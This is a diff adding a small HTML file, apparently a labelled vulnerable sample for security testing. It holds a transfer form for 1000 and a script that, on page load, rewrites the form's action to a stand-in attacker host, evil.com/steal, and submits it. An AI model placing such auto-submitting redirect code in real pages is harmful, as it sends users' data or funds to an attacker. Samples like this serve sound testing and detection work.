@@ -1,0 +1,21 @@
+<!--
+ Vulnerable as form is allowed to be redirected to attacker URLs and allows them to steal funds
+ or perform malicious actions on behalf of the user
+-->
+<html>
+<body>
+    <form id="form" action="https://example.com/transfer" method="post">
+        <input type="hidden" name="amount" value="1000">
+        <input type="submit" value="Transfer">
+    </form>
+
+    <script>
+        var website = "https://evil.com";
+        window.onload = function() {
+            var form = document.getElementById("form");
+            form.action = website + "/steal";
+            form.submit();
+        };
+    </script>
+</body>
+</html>
